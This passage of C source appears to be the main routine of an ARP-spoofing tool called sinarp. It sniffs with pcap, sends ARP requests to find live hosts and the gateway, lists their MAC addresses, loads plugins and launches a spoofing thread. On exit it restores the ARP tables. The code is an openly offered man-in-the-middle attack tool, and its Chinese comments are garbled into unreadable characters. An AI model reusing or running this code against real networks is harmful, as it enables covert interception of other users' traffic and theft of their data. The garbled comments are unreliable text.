        g_my_mac[1],
        g_my_mac[2],
        g_my_mac[3],
        g_my_mac[4],
        g_my_mac[5]);
    if (pf_pcap_compile(g_adhandle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
    {
        fprintf(stderr,"\nUnable to compile the packet filter\n");
        /* Free the device list */
        goto clean;
    }
    //���ù�����
    if (pf_pcap_setfilter(g_adhandle, &fcode) < 0)
    {
        fprintf(stderr,"\nError setting the filter.\n");
        /* Free the device list */
        goto clean;
    }

    //���������߳� ���ڲ����߳����� ��� �����������ǻظ� ARP ����Ļ� ��ô���Ǿ͸������ǵ������������ MAC����Ϣ
    sinarp_create_thread(sinarp_capture_thread,NULL);
    Sleep(1000);//�ȴ�һ���� ȷ�����ݰ��Ĳ���ʼ��
    sinarp_printf("start capture.....\n");
    //���ھ���Ҫɨ��������� ����� MAC ��ַ��
    // ����ʲô��� ���Ƕ����Ի�ȡ�� ���ص� mac ��ַ ���ݰ�ת����ʱ�� ���õ��� 
    for (idx = 0 ;idx < 0xFF;idx++)
    {
        switch(g_HostList[idx].type)
        {
        case HOST_A:
        case HOST_B:
            {
                sinarp_send_arp(g_HostList[idx].ip);
            }
            break;
        default:
            if(g_HostList[idx].ip == g_my_gw_addr)
            {
                sinarp_send_arp(g_my_gw_addr);
            }
            break;
        }
    }
    Sleep(2000);//�ȴ�5���� �����е��������ظ������ǵ� ARP ����
    //��� A B �� ���ٸ���ȡ��һ�������� MAC ��ַ
    active_count_B = active_count_A = 0;
    for (idx = 0;idx < 0xFF;idx ++)
    {
        switch(g_HostList[idx].type)
        {
        case HOST_A:
            // if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if(g_HostList[idx].active == 1)
                ++active_count_A;
            break;
        case HOST_B:
            //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if(g_HostList[idx].active == 1)
                ++active_count_B;
            break;
        default:
            break;
        }
    }
    if(active_count_A < 1 || active_count_B < 1)
    {
        printf("do not find ant active host~~\n");
        pf_pcap_breakloop(g_adhandle);
        goto clean;
    }
    //��ӡ�»�����б�
    sinarp_printf("Active host list:\n");
    sinarp_printf("M:\n");
    sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
        sinarp_iptos(g_my_ip),
        g_my_mac[0],
        g_my_mac[1],
        g_my_mac[2],
        g_my_mac[3],
        g_my_mac[4],
        g_my_mac[5]);
    sinarp_printf("A:\n");
    for (idx = 0 ;idx < 0xFF ;idx ++)
    {
        switch(g_HostList[idx].type)
        {
        case HOST_A:
            //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if(g_HostList[idx].active == 1)
            {
                sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                    sinarp_iptos(g_HostList[idx].ip),
                    g_HostList[idx].mac[0],
                    g_HostList[idx].mac[1],
                    g_HostList[idx].mac[2],
                    g_HostList[idx].mac[3],
                    g_HostList[idx].mac[4],
                    g_HostList[idx].mac[5]);
            }
            break;
        default:
            break;
        }
    }

    sinarp_printf("B:\n");
    for (idx = 0 ;idx < 0xFF ;idx ++)
    {
        switch(g_HostList[idx].type)
        {
        case HOST_A:
            break;
        case HOST_B:
            //if(memcmp(g_HostList[idx].mac,g_zero_mac,6) !=0)
            if(g_HostList[idx].active == 1)
            {
                sinarp_printf("\t%-20s %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
                    sinarp_iptos(g_HostList[idx].ip),
                    g_HostList[idx].mac[0],
                    g_HostList[idx].mac[1],
                    g_HostList[idx].mac[2],
                    g_HostList[idx].mac[3],
                    g_HostList[idx].mac[4],
                    g_HostList[idx].mac[5]);
            }
            break;
        default:
            break;
        }
    }

	memcpy(g_my_gw_mac,g_HostList[g_my_gw_addr >> 24].mac,6);

    if(g_auto_ip_forward == 0)
    {
          sinarp_printf("Warning:sinarp run without ip forward..\n");
    }
	//start load plugin
	if(plugin_string)
	{
		sinarp_printf("\rloading plugin...\n");
		sinarp_parse_plugin_string(plugin_string);
	}
    //check plugin
    if(g_plugin_list.count < 1)
    {
        sinarp_printf("Warning: sinarp do not load any plugin !\n");
    }
    else
    {
        //��ӡ�¼��صĲ���б�
        sinarp_printf("loaded plugin:\n");
        for (idx =0;idx < g_plugin_list.count;idx ++)
        {
            sinarp_printf("\t%s\n",g_plugin_list.plugin[idx].name);
        }
    }
    //����������ƭ�߳�
    sinarp_create_thread(sinarp_spoof_thread,NULL);
    Sleep(1000);
#ifdef WIN32
    SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#else
    (void)setsignal(SIGPIPE, cleanup);
    (void)setsignal(SIGTERM, cleanup);
    (void)setsignal(SIGINT, cleanup);
#endif
    //�ȴ��������߳��˳��ɡ�����
    while (g_is_capture_thread_active || g_is_spoof_thread_active)
    {
        Sleep(100);
#ifdef WIN32
        sinarp_printf("\rprocessed packet %I64u",g_packet_count);
#else
        sinarp_printf("\rprocessed packet %llu",g_packet_count);
#endif
    }
    //�˳���ʱ�� �������б������������ ARP �� �ָ���ARP����
    sinarp_printf("\rRestoring the ARPTable......\r\n");
    sinarp_restore_arp_table();//�ָ�����
    sinarp_restore_arp_table();
    sinarp_printf("\rbye....\n");
clean:
    if(pdevs)
        pf_pcap_freealldevs(pdevs);
    if(g_plugin_list.count > 0)
        sinarp_free_plugin_list();
    return 0;
}

